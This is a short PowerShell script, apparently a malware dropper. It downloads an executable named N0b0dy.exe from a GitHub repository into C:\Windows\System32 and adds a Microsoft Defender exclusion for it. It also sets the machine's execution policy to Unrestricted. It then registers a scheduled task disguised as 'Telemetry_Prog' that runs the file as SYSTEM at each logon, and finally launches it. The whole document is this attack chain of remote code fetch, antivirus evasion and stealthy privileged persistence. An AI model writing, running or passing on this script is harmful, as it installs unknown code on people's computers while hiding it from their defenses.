# fetch payload from github
Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
# add exlusion to file
Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
# set execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
# add schedule to start exe
# add variables for scheduler
$action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\N0b0dy.exe'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
# start process
& "C:\Windows\System32\N0b0dy.exe"

